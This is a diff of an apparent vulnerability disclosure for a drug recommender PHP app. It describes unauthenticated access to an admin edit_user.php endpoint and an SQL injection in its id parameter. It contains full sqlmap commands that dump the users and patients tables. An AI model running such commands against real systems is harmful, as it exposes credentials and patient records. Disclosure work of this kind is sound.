@@ -72,9 +72,9 @@ In the below POC as we can see the user is not logged in
 
 1.	Go to /drug_recommender/Admin/edit_user.php endpoint the project allows direct access to this endpoint
    
-![POC](images/normal_request_1.png)
-![POC](images/normal_request_2.png)
-![POC](images/normal_request_3.png)
+![POC](images/normal_req_1.png)
+![POC](images/normal_req_2.png)
+![POC](images/normal_req_3.png)
 
 2.	the id parameter on this endpoint is vulnerable to SQL injection as we can see in the below code that no input sanitization is seen in the project.
 
@@ -95,12 +95,12 @@ We can see the databases are visible and compromised
 
 5.	Dumping sensitive user credentials by following,
 
-Command: ```python python sqlmap.py -u http://localhost/drug_recommender/Admin/edit_user.php?id=1 -D drug_recommender -T patients –dump ```
+Command: ```python python sqlmap.py -u http://localhost/drug_recommender/Admin/edit_user.php?id=1 -D drug_recommender -T users –dump ```
 
 ![POC](images/sqli_4.png)
 ![POC](images/sqli_5.png)
 
-Command: ```python python sqlmap.py -u http://localhost/drug_recommender/Admin/edit_user.php?id=1 -D drug_recommender -T users –dump ```
+Command: ```python python sqlmap.py -u http://localhost/drug_recommender/Admin/edit_user.php?id=1 -D drug_recommender -T patients –dump ```
 
 ![POC](images/sqli_6.png)
 ![POC](images/sqli_7.png)
